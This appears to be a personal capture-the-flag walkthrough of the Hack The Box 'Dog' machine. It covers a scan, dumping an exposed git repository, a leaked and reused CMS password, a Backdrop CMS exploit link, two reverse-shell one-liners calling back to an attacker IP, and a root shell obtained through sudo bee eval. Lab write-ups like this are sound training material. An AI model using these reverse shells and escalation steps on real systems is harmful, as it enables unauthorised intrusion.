# Dog machine 

IP: 10.129.195.185

Command: nmap -sV -sC -A 10.129.195.185

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-06 15:54 EDT
Nmap scan report for 10.129.195.185
Host is up (0.026s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)
|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)
|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-git: 
|   10.129.195.185:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-robots.txt: 22 disallowed entries (15 shown)
| /core/ /profiles/ /README.md /web.config /admin 
| /comment/reply /filter/tips /node/add /search /user/register 
|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
|_http-title: Home | Dog
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   31.37 ms 10.10.14.1
2   31.39 ms 10.129.195.185

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.67 seconds

```
There is a git folder, let's try to see:
git clone https://github.com/Ebryx/GitDump.git

Helpful URL: https://stackoverflow.com/questions/75602063/pip-install-r-requirements-txt-is-failing-this-environment-is-externally-mana

Another one that is worked:
Command: git clone https://github.com/arthaud/git-dumper.git 

Helpful URL: https://stackoverflow.com/questions/1337320/how-can-i-grep-git-commits-for-a-certain-word

```
cat  settings.php
<?php
/**
 * @file
 * Main Backdrop CMS configuration file.
 */

/**
 * Database configuration:
 *
 * Most sites can configure their database by entering the connection string
 * below. If using primary/replica databases or multiple connections, see the
 * advanced database documentation at
 * https://api.backdropcms.org/database-configuration
 */
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
```

https://stackoverflow.com/questions/16956810/find-all-files-containing-a-specific-text-string-on-linux

┌──(.venv)─(kali㉿kali)-[~/git-dumper/outout]
└─$ grep -rnw . -e "htb"        
./files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json:12:        "tiffany@dog.htb"
./.git/logs/refs/heads/master:1:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000     commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases
./.git/logs/HEAD:1:0000000000000000000000000000000000000000 8204779c764abd4c9d8d95038b6d22b6a7515afa root <dog@dog.htb> 1738963331 +0000  commit (initial): todo: customize url aliases. reference:https://docs.backdropcms.org/documentation/url-aliases

Creds:tiffany@dog.htb:BackDropJ2024DS2024

Exploit: https://www.exploit-db.com/exploits/52021

Revere Shell:www-data:
shell command from the input: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.235 1234 >/tmp/f

Reverse shell:
bash -c 'bash -i >& /dev/tcp/10.10.14.235/1234 0>&1'
Our local machine: nc -nvlp 1234

su johncusack
password: BackDropJ2024DS2024

cd johncusack
cat user.txt

# Privilege Escalation

Command: sudo -l

Useful link: https://github.com/backdrop-contrib/bee/wiki/Usage

```
Advanced
eval

Description: Evaluate (run/execute) arbitrary PHP code after bootstrapping Backdrop.
Aliases: ev , php-eval
Arguments:

    code - The PHP code to evaluate.

Examples:

    bee eval '$node = node_load(1); print $node->title;' - Loads node with nid 1 and then prints its title.
    bee eval "node_access_rebuild();" - Rebuild node access permissions.
    bee eval "file_unmanaged_copy('$HOME/Pictures/image.jpg', 'public://image.jpg');" - Copies a file whose path is determined by an environment's variable. Note the use of double quotes so the variable $HOME gets replaced by its value.

```

Command: sudo bee --root=/var/www/html php-eval 'system("/bin/bash");'

Different aliases: sudo bee --root=/var/www/html eval 'system("/bin/bash");'



